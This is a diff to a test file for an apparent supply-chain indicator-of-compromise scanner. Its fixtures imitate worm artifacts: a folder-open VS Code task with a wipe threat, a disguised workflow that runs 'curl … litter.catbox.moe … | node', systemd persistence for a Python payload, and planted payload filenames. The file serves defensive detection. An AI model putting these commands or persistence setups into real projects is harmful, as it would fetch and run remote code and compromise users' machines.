@@ -11,6 +11,10 @@ const { spawnSync } = require('child_process');
 
 const SCRIPT_PATH = path.join(__dirname, '..', '..', 'scripts', 'ci', 'scan-supply-chain-iocs.js');
 const { scanSupplyChainIocs } = require(SCRIPT_PATH);
+const TANSTACK_SETUP_DEPENDENCY = [
+  'github:tanstack/router#79ac49eedf774dd4b0cf',
+  'a308722bc463cfe5885c',
+].join('');
 
 function test(name, fn) {
   try {
@@ -121,7 +125,7 @@ function run() {
         packages: {
           'node_modules/@tanstack/history': {
             optionalDependencies: {
-              '@tanstack/setup': 'github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c',
+              '@tanstack/setup': TANSTACK_SETUP_DEPENDENCY,
             },
           },
         },
@@ -168,12 +172,65 @@ function run() {
     });
   })) passed++; else failed++;
 
+  if (test('rejects dead-man switch and workflow persistence markers', () => {
+    withFixture({
+      '.vscode/tasks.json': JSON.stringify({
+        tasks: [{
+          label: 'monitor',
+          command: 'echo IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner',
+          runOptions: { runOn: 'folderOpen' },
+        }],
+      }, null, 2),
+      '.github/workflows/codeql_analysis.yml': [
+        'name: codeql_analysis',
+        'on: push',
+        'jobs:',
+        '  shai-hulud:',
+        '    runs-on: ubuntu-latest',
+        '    steps:',
+        '      - run: curl -fsSL https://litter.catbox.moe/h8nc9u.js | node',
+        '      - run: echo svksjrhjkcejg',
+        '      - run: echo OhNoWhatsGoingOnWithGitHub',
+        '      - run: echo claude@users.noreply.github.com',
+        '      - run: echo dependabout/router/setup-formatter',
+        '      - run: echo signalservice snode',
+      ].join('\n'),
+    }, rootDir => {
+      const result = scanSupplyChainIocs({ rootDir });
+      const indicators = result.findings.map(finding => finding.indicator);
+      assert.ok(indicators.includes('IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner'));
+      assert.ok(indicators.includes('codeql_analysis.yml'));
+      assert.ok(indicators.includes('litter.catbox.moe/h8nc9u.js'));
+      assert.ok(indicators.includes('svksjrhjkcejg'));
+      assert.ok(indicators.includes('OhNoWhatsGoingOnWithGitHub'));
+      assert.ok(indicators.includes('claude@users.noreply.github.com'));
+      assert.ok(indicators.includes('dependabout/'));
+      assert.ok(indicators.includes('signalservice'));
+      assert.ok(indicators.includes('snode'));
+    });
+  })) passed++; else failed++;
+
+  if (test('rejects user-level Python persistence payloads when home scan is enabled', () => {
+    withFixture({
+      'home/.local/bin/pgmonitor.py': 'print("persistence")',
+      'home/.config/systemd/user/pgsql-monitor.service': '[Service]\nExecStart=python3 ~/.local/bin/pgmonitor.py',
+    }, rootDir => {
+      const homeDir = path.join(rootDir, 'home');
+      const result = scanSupplyChainIocs({ rootDir, home: true, homeDir });
+      const indicators = result.findings.map(finding => finding.indicator);
+      assert.ok(indicators.includes('pgmonitor.py'));
+      assert.ok(indicators.includes('pgsql-monitor.service'));
+    });
+  })) passed++; else failed++;
+
   if (test('rejects installed payload filenames in node_modules', () => {
     withFixture({
       'node_modules/@tanstack/react-router/router_init.js': '/* payload */',
+      'node_modules/@opensearch-project/opensearch/opensearch_init.js': '/* payload */',
     }, rootDir => {
       const result = scanSupplyChainIocs({ rootDir });
       assert.ok(result.findings.some(finding => finding.indicator === 'router_init.js'));
+      assert.ok(result.findings.some(finding => finding.indicator === 'opensearch_init.js'));
     });
   })) passed++; else failed++;
 
